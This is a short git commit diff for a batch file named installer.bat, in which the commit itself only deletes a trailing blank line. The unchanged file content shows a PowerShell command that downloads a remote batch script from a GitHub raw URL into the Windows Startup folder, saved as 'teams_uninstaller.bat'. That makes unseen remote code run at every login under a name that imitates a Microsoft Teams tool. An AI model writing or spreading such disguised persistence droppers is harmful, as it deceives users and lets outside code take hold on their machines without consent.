6ba1fb5061a73d4d33a8b98ebe670bec47907551
sossinayDev <125735344+sossinayDev@users.noreply.github.com>
2024-09-30 14:40:51 +0200

    Added level 1

--- stuff/alcrax/installer.bat
+++ stuff/alcrax/installer.bat
@@ -3,4 +3,3 @@ start explorer
 
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/main.bat' -OutFile \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\teams_uninstaller.bat\""
 
-
